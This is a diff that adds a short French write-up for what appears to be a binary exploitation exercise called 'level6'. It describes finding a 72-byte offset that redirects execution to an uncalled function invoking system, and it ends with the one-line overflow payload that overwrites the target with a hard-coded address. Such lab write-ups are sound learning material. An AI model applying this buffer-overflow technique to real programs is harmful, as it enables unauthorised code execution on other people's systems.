@@ -1,0 +1,7 @@
+Nous avons pu observer que le binaire prend un parametre en entree.
+Nous avons donc cherche, en testant, l'offset de ce parametre et trouve 72.
+Nous avons par la meme occasion trouve une fonction qui n'etait jamais appele
+'n' et a la place 'm' etait appele. 'm' ecrit "nop" sur la sortie standard
+alors que n appel system. Nous avons cherche un moyen d'appele n.
+
+./level6 $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
